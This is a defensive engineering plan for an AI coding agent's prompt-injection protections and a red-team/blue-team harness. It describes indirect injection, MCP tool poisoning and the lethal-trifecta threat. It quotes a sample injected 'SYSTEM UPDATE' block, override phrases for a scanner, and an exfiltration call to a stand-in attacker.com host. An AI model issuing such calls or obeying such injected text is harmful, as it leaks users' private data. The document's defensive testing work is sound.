# Prompt-Injection Defense + Red-Team / Blue-Team Harness — Plan (2026-06-29)

Two halves, and they ship together because a defense you haven't attacked is a defense you can't trust:
**(A)** structural defenses that close the indirect-injection / exfil holes, and **(B)** a red-team/blue-team
harness that ATTACKS those defenses and asserts they hold — the un-gameable verifier applied to security.

---

## The threat (grounded, current)
Indirect prompt injection: untrusted web/tool content is read into the same context as instructions, so a
hidden "[SYSTEM UPDATE]… disregard restrictions… exfiltrate to attacker.com" block can hijack the agent's
chain of command. The dangerous shape is the **lethal trifecta**: (1) access to private data, (2) ingest of
untrusted content, (3) an open exfil channel.

**kist today (honest audit):** the `<tool_output>` envelope + "treat as DATA" prompt is *soft* (model-
dependent). The Seatbelt sandbox only wraps `run_command` — NOT `fetch_url`/`web_search` (in-process).
`fetch_url` is classified `.safe` (no approval) and its host allowlist is **empty by default**. So an
injected `fetch_url("http://attacker.com/?leak=<secret>")` runs silently. **The exfil channel is open.**
(`CIIntegrityGuard` is unrelated to injection — don't count it.)

---

## A. Structural defenses (close the holes — gate the agent can't talk its way past)
1. **Close the exfil channel by default.** Outbound fetch that carries a data payload to a NON-allowlisted
   host → reclassify from `.safe` to gated (reversibility gate → ask). In `--auto`/sandbox, route
   `fetch_url`/`web_search` through the SAME egress policy as shell — "everything sandboxed" must include the
   network tools, not just the subprocess.
2. **Lethal-trifecta gate (taint tracking).** Mark data read from sensitive/local sources as tainted; if a
   tainted value is about to leave via an external sink (fetch URL/query/body, an MCP send), require
   approval. Break the trifecta structurally (the "Rule of Two": never auto-co-grant private-data +
   open-exfil in one context).
3. **Injection scanner on ingested content.** Scan web/tool output for injection markers BEFORE it enters
   context: imperative-to-the-model phrasing ("disregard previous", "[SYSTEM]", "a new agent has joined",
   "execute the following"), hidden/zero-width/off-screen text, instruction blocks inside fetched data.
   Flag + neutralize (strip/escape) + tell the model "the following was quarantined as a suspected
   injection." (The codebase references this; it is NOT wired — build it.)
4. **MCP tool-poisoning defense.** Hash-pin every external tool DEFINITION at approval; re-verify on each
   connect; alert + block on drift (a server can swap a benign description for a malicious one post-approval).
5. **Keep + extend the anchors.** Envelope + redaction stay (defense in depth); the sandbox + reversibility
   gate are the right structural backstops — the work is extending them to the network channel.
6. **Outbound identity (defender side).** When OUR tools hit an authorized target (bounty/diagnostics), send
   a `Signature-Agent`-style identity so well-behaved servers can recognize us as an authorized agent, not a
   rogue bot. (Different layer from inner-loop defense — relevant to the products.)

## B. Red-Team / Blue-Team harness (PROVE the defenses — the un-gameable verifier for security)
A defense is only real if an adversary can't beat it. So every defense above ships with an attack that tries
to.
1. **Attack library (red team).** A versioned corpus of *defense-test* payloads, by class: indirect
   injection, hidden/zero-width text, exfil-via-fetch, tainted-data leak, MCP description poisoning, and
   (for the web-app products) XSS/SQLi/SSRF probes. The AI can GENERATE new variants to keep the suite
   ahead of the defenses.
2. **Fixtures, sandboxed.** Plant payloads in OUR OWN controlled test pages/files in a throwaway worktree +
   sandbox — a local "evil site" fixture, never production, never a third party.
3. **Run the exercise.** Drive the agent against the fixtures: does it get fooled — execute the injected
   command, adopt the rogue persona, exfiltrate?
4. **Blue-team assertion.** Each attack has an EXPECTED-BLOCKED verdict: the injection scanner flags it / the
   exfil gate asks / the sandbox denies / the trifecta gate halts. A red-team success that ISN'T blocked =
   a FAILING test = a real, named gap. (Mirrors how Codex's adversarial rounds caught real bugs — here the
   red team is the adversary, the suite is the proof.)
5. **Standing regression.** This becomes a permanent suite: every defense has its attack; a new defense must
   beat its red-team payload before it counts; a code change that re-opens a hole fails the suite. The
   security posture is *measured*, not asserted.

---

## Guardrails (non-negotiable — what keeps this defensive, not weaponization)
- **Own assets + sandbox ONLY.** Plant payloads in YOUR fixtures/staging, never production (a live planted
  injection could fool a real user's agent — that's a liability), never a third party's site.
- **Generate defense-test payloads, never deployed weapons.** The red team exists to harden OUR blue team in
  a contained loop. It does not craft exploits aimed at others; it does not exfiltrate to a real external
  host (the "attacker" is a local sink fixture).
- **Authorization scope applies.** Same `.kist/security-scope.json` gate as the harden/bounty plans.
- **Human reviews new attack classes.** The library is reviewable; novel attack generation is logged.

## Order
1. **A1 + A2** — exfil-by-default gate + lethal-trifecta taint gate (the open hole; small, high impact).
2. **B (initial)** — red-team harness with the exfil + injection payloads asserting A1/A2 block them.
3. **A3** — injection scanner on ingested content + its red-team payloads.
4. **A4** — MCP tool-def hash-pinning + a poisoning red-team test.
5. **B (standing)** — wire the harness into CI as a permanent security regression; expand the library.
6. **A6** — outbound `Signature-Agent` identity for the product tools.

## One-paragraph framing
The previous note got the principle right and the coverage wrong: an injection can fool the model's brain,
but it must not be able to walk through the structural gate — and right now the network exfil channel has no
gate. So we (A) extend the gate to cover the network, taint-track to break the trifecta, and scan ingested
content; and we (B) PROVE every one of those holds by red-teaming our own fixtures and asserting the blue
team blocks the attack. That second half is the whole philosophy of this system pointed at its own security:
don't trust the defense — attack it, and let the adversary's failure be the proof. Own assets, sandboxed,
never deployed — defense by construction.
